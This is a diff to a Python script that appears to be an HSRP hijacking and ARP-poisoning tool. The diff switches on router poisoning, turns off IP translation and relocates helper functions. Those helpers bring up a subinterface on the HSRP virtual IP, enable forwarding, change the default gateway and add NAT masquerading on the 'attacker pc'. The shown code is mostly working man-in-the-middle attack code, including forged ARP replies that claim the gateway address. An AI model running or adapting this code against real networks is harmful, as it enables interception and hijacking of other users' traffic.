@@ -10,11 +10,11 @@ import random
 # change as necessary
 interface = "eth0"
 # option to poison router if sniffing of response is required, makes attack more noisy
-poisonrouter = False
+poisonrouter = True
 # option to force use of own mac address only when sending hsrp and arp packets
 attackportsecurity = True
 # force use of own ip only when forwarding packets. poisonrouter not required when translateip set to True
-translateip = True
+translateip = False
 debug = True
 terminateonfail = False
 # for testing only, to set to false when running attack
@@ -181,32 +181,6 @@ def send_initial_arp(packet):
     pkt = Ether(src=ethersrc, dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, hwsrc=ethersrc, psrc=virtualIP, hwdst="ff:ff:ff:ff:ff:ff", pdst=virtualIP)
     sendp(pkt, inter=hellotime, verbose=False)
 
-# Start subinterface on attacker pc with same IP as HSRP gateway virtualip (to let linux handle forwarding of packets)
-def start_subinterface(packet):
-    if version == 1:
-        virtualIP = packet[HSRP].virtualIP
-    else:
-        #######################
-        return
-    if debug:
-        print(f"Starting sub interface with IP: {virtualIP} on {interface}")
-    subprocess.run(["ifconfig", f"{interface}:1", virtualIP, "netmask", mynetmask, "up"])
-
-# Enable routing of received packets on attacker pc (let linux handle packet forwarding)
-def enable_forwarding():
-    if debug:
-        print("Enabling packet forwarding on linux:")
-    subprocess.run("sysctl -w net.ipv4.ip_forward=1".split())
-
-# Change default gateway of attacker pc to one of the HSRP routers
-def change_default_gw(routerIP):
-    if debug:
-        print(f"Changing default gateway to: {routerIP}")
-    subprocess.run(f"route add default gw {routerIP} {interface}".split())
-    
-def enable_translation():
-    subprocess.run(f"iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE".split())
-
 # sniff and respond to arp request for HSRP virtual ip address from network
 def start_arp_responder(packet):
     if version == 1:
@@ -345,6 +319,33 @@ def simple_poison():
             etherdst = "ff:ff:ff:ff:ff:ff"
             sendp(Ether(src=mymac, dst=etherdst)/ARP(op=2, hwsrc=mymac, psrc=gateway, hwdst=etherdst, pdst=gateway), verbose=False)
             last += 2
+
+# Start subinterface on attacker pc with same IP as HSRP gateway virtualip (to let linux handle forwarding of packets)
+def start_subinterface(packet):
+    if version == 1:
+        virtualIP = packet[HSRP].virtualIP
+    else:
+        #######################
+        return
+    if debug:
+        print(f"Starting sub interface with IP: {virtualIP} on {interface}")
+    subprocess.run(["ifconfig", f"{interface}:1", virtualIP, "netmask", mynetmask, "up"])
+
+# Enable routing of received packets on attacker pc (let linux handle packet forwarding)
+def enable_forwarding():
+    if debug:
+        print("Enabling packet forwarding on linux:")
+    subprocess.run("sysctl -w net.ipv4.ip_forward=1".split())
+
+# Change default gateway of attacker pc to one of the HSRP routers
+def change_default_gw(routerIP):
+    if debug:
+        print(f"Changing default gateway to: {routerIP}")
+    subprocess.run(f"route add default gw {routerIP} {interface}".split())
+
+# Let linux perform nat translation    
+def enable_translation():
+    subprocess.run(f"iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE".split())
             
 def delayed_failure_check():
     start = time.time()
